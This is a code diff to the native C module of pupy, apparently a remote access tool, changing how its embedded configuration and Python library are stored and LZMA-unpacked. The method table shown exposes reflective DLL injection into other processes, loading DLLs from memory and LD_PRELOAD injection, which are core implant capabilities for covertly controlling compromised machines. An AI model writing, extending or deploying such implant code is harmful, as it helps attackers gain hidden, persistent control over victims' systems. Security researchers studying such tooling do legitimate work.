@@ -10,24 +10,37 @@
 #include "debug.h"
 #include "Python-dynload.h"
 #include "daemonize.h"
+#include <arpa/inet.h>
+#include "tmplibrary.h"
+
+#include "resources_library_compressed_string_txt.c"
 
 int linux_inject_main(int argc, char **argv);
 
-static char module_doc[] = "Builtins utilities for pupy";
+static const char module_doc[] = "Builtins utilities for pupy";
 
-extern const char resources_library_compressed_string_txt_start[];
-extern const int resources_library_compressed_string_txt_size;
-char pupy_config[40960]="####---PUPY_CONFIG_COMES_HERE---####\n"; //big array to have space for more config / code run at startup
+static const char pupy_config[8192]="####---PUPY_CONFIG_COMES_HERE---####\n";
+
 extern const uint32_t dwPupyArch;
-static PyObject *Py_get_compressed_library_string(PyObject *self, PyObject *args)
+
+#include "lzmaunpack.c"
+
+static PyObject *Py_get_modules(PyObject *self, PyObject *args)
 {
-	return Py_BuildValue("s#", resources_library_compressed_string_txt_start, resources_library_compressed_string_txt_size);
+	return PyObject_lzmaunpack(
+		resources_library_compressed_string_txt_start,
+		resources_library_compressed_string_txt_size
+	);
 }
 
 static PyObject *
 Py_get_pupy_config(PyObject *self, PyObject *args)
 {
-	return Py_BuildValue("s", pupy_config);
+	size_t compressed_size = ntohl(
+		*((unsigned int *) pupy_config)
+	);
+
+	return PyObject_lzmaunpack(pupy_config+sizeof(int), compressed_size);
 }
 
 static PyObject *Py_get_arch(PyObject *self, PyObject *args)
@@ -162,7 +175,7 @@ static PyObject *Py_load_dll(PyObject *self, PyObject *args)
 static PyMethodDef methods[] = {
 	{ "get_pupy_config", Py_get_pupy_config, METH_NOARGS, "get_pupy_config() -> string" },
 	{ "get_arch", Py_get_arch, METH_NOARGS, "get current pupy architecture (x86 or x64)" },
-	{ "_get_compressed_library_string", Py_get_compressed_library_string, METH_VARARGS },
+	{ "get_modules", Py_get_modules, METH_NOARGS, "get pupy library" },
 	{ "reflective_inject_dll", Py_reflective_inject_dll, METH_VARARGS|METH_KEYWORDS, "reflective_inject_dll(pid, dll_buffer, isRemoteProcess64bits)\nreflectively inject a dll into a process. raise an Exception on failure" },
 	{ "load_dll", Py_load_dll, METH_VARARGS, "load_dll(dllname, raw_dll) -> bool" },
 	{ "ld_preload_inject_dll", Py_ld_preload_inject_dll, METH_VARARGS, "ld_preload_inject_dll(cmdline, dll_buffer, hook_exit) -> pid" },
